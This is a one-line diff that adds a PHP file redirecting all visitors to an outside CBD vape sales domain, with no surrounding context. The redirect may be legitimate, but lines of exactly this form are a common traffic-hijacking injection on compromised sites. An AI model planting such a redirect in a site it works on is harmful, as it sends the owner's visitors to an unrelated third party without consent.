@@ -1,0 +1,1 @@
+<?php header("Location: http://cbd.keyvapours.com"); ?>
